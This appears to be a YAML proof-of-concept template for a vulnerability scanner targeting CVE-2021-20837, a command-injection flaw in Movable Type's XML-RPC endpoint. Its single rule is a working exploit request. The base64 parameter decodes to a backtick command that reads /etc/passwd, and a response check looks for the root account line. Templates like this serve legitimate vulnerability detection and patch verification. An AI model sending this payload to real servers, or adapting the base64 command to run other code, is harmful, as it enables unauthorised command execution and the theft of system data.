name: yaml-poc-sixapart-movable_type-unauthorized_access-CVE-2021-20837
binding: 83c75805-6f45-4309-954e-903395fd213b
detail:
    author: system_user
    links:
        - http://packetstormsecurity.com/files/164705/Movable-Type-7-r.5002-XMLRPC-API-Remote-Command-Injection.html
        - http://packetstormsecurity.com/files/164818/Movable-Type-7-r.5002-XMLRPC-API-Remote-Command-Injection.html
        - https://jvn.jp/en/jp/JVN41119755/index.html
        - https://jvndb.jvn.jp/en/contents/2021/JVNDB-2021-000093.html
        - https://movabletype.org/news/2021/10/mt-782-683-released.html
        - https://nvd.nist.gov/vuln/detail/CVE-2021-20837
        - https://packetstormsecurity.com/files/164705/Movable-Type-7-r.5002-XMLRPC-API-Remote-Command-Injection.html
        - https://packetstormsecurity.com/files/164818/Movable-Type-7-r.5002-XMLRPC-API-Remote-Command-Injection.html
        - https://www.cybersecurity-help.cz/vdb/SB2021102007
        - https://www.exploit-db.com/exploits/50464
    vulnerability:
        id: f067b181-f3f2-4fd9-a223-5bb238bb0f07
        level: critical
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /cgi-bin/mt/mt-xmlrpc.cgi
            headers:
                Content-Type: text/xml
            body: <?xml version="1.0"?><methodCall><methodName>mt.handler_to_coderef</methodName><params><param><value><base64>YGNhdCAvZXRjL3Bhc3N3ZGA=</base64></value></param></params></methodCall>
            follow_redirects: false
        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
expression: r0()
